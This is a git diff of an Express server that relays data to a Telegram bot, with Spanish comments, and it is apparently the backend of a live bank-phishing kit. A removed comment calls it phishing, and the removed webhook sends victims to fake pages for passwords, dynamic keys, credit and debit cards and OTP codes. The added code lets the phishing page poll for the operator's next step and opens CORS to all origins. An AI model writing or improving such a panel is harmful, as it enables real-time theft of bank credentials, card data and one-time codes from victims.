@@ -1,26 +1,19 @@
 import express from 'express';
 import cors from 'cors';
+import TelegramBot from 'node-telegram-bot-api';
 
 const app = express();
 
-// CORS permisivo para que funcione desde file:// y localhost (phishing local)
+// CORS muy permisivo (necesario para pruebas locales/file://)
 app.use(cors({
-  origin: function (origin, callback) {
-    if (!origin || origin === 'null' || origin.includes('localhost')) {
-      callback(null, true);
-    } else {
-      callback(new Error('Not allowed by CORS'));
-    }
-  },
+  origin: '*',
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type']
 }));
 
-app.options('*', cors());
-
 app.use(express.json());
 
-// Variables de entorno (Render las inyecta)
+// Variables de entorno (Render)
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const SECRET_PATH = process.env.SECRET_PATH || 'x7k9p2m-q8z-send-v3';
@@ -30,128 +23,83 @@ if (!TELEGRAM_TOKEN || !CHAT_ID) {
   process.exit(1);
 }
 
-// Ruta principal: enviar mensaje inicial con botones
+// Bot en modo polling
+const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+
+// Almacenamiento temporal de callbacks recibidos
+// transactionId → callback_data completa
+const pendingCallbacks = new Map();
+
+bot.on('callback_query', async (query) => {
+  try {
+    const data = query.data;
+    const txIdMatch = data.match(/:([^:]+)$/);
+    
+    if (txIdMatch) {
+      const txId = txIdMatch[1];
+      pendingCallbacks.set(txId, data);
+
+      console.log(`[CALLBACK] Recibido para ${txId}: ${data}`);
+
+      // Responder al callback (quita el loading en Telegram)
+      await bot.answerCallbackQuery(query.id);
+
+      // Opcional pero recomendado: quitar los botones
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
+        {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id,
+        }
+      ).catch(() => {}); // ignorar error si ya se quitaron
+    }
+  } catch (err) {
+    console.error('Error procesando callback_query:', err);
+  }
+});
+
+// Ruta para enviar el mensaje inicial con botones
 app.post(`/${SECRET_PATH}`, async (req, res) => {
   try {
-    const body = req.body;
-    if (!body || !body.text) {
+    const { text, reply_markup, parse_mode = 'HTML' } = req.body;
+
+    if (!text) {
       return res.status(400).json({ ok: false, error: 'Falta texto del mensaje' });
     }
 
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        ...body,
-        chat_id: CHAT_ID,
-      }),
+    const sentMessage = await bot.sendMessage(CHAT_ID, text, {
+      reply_markup: reply_markup ? JSON.parse(reply_markup) : undefined,
+      parse_mode,
     });
 
-    const data = await response.json();
-    res.status(response.status).json(data);
+    res.json({ ok: true, result: sentMessage });
   } catch (error) {
-    console.error('Error enviando mensaje:', error);
-    res.status(500).json({ ok: false, error: 'Error interno' });
+    console.error('Error enviando mensaje inicial:', error.message);
+    res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// ────────────────────────────────────────────────────────────────
-// WEBHOOK PRINCIPAL - Aquí Telegram envía TODOS los updates (incluyendo callbacks)
-app.post('/webhook', async (req, res) => {
-  try {
-    const update = req.body;
+// Ruta que el cliente consulta (polling corto)
+app.get('/check/:transactionId', (req, res) => {
+  const txId = req.params.transactionId;
+  const callbackData = pendingCallbacks.get(txId);
 
-    // Solo procesamos callbacks por ahora
-    if (update.callback_query) {
-      const cq = update.callback_query;
-      const data = cq.data;
-      const chatId = cq.message.chat.id;
-      const messageId = cq.message.message_id;
-
-      console.log('Callback recibido:', data);
-
-      // 1. Responder al callback (quita el loading en el botón)
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          callback_query_id: cq.id,
-          // show_alert: true, text: 'Procesando...'  ← opcional
-        })
-      });
-
-      // 2. Eliminar los botones inline
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          message_id: messageId,
-          reply_markup: { inline_keyboard: [] }
-        })
-      });
-
-      // 3. Mapear callback_data → URL de redirección (cambia el dominio por el tuyo real)
-      let redirectUrl = '';
-
-      if (data.startsWith('error_logo:')) {
-        redirectUrl = 'index1.html';
-      } else if (data.startsWith('error_clave:')) {
-        redirectUrl = 'index2.html';
-      } else if (data.startsWith('pedir_dinamica:')) {
-        redirectUrl = 'index3.html';
-      } else if (data.startsWith('error_dinamica:')) {
-        redirectUrl = 'error_dinamica.html';
-      } else if (data.startsWith('pedir_tc:')) {
-        redirectUrl = 'desembolso.html';
-      } else if (data.startsWith('error_tc:')) {
-        redirectUrl = 'desembolso.html?error=true';
-      } else if (data.startsWith('pedir_td:')) {
-        redirectUrl = 'tarjeta_debito.html';
-      } else if (data.startsWith('error_td:')) {
-        redirectUrl = 'tarjeta_debito.html?error=true';
-      } else if (data.startsWith('soy:')) {
-        redirectUrl = 'soyyo.html';
-      } else if (data.startsWith('otp:')) {
-        redirectUrl = 'otp.html';
-      } else if (data.startsWith('error_otp:')) {
-        redirectUrl = 'otp.html?error=true';
-      } else if (data.startsWith('finalizar:')) {
-        redirectUrl = 'final1.html';
-      }
-
-      // 4. Enviar mensaje con el link de continuación
-      if (redirectUrl) {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: `Continúa el proceso aquí:\n${redirectUrl}\n\n(Enlace de verificación)`,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true   // evita que Telegram genere preview
-          })
-        });
-      }
-    }
-
-    res.sendStatus(200); // Telegram necesita 200 rápido
-  } catch (err) {
-    console.error('Error procesando webhook:', err);
-    res.sendStatus(500);
+  if (callbackData) {
+    pendingCallbacks.delete(txId); // limpiar para no repetir
+    res.json({ ok: true, callback_data: callbackData });
+  } else {
+    res.json({ ok: false });
   }
 });
 
-// Health check para Render
+// Health check básico para Render
 app.get('/health', (req, res) => {
-  res.json({ status: 'ok' });
+  res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Servidor escuchando en puerto ${PORT}`);
-  console.log(`Webhook: /webhook`);
-  console.log(`Envío inicial: /${SECRET_PATH}`);
+  console.log(`Endpoint envío:   /${SECRET_PATH}`);
+  console.log(`Polling activo - esperando callbacks...`);
 });
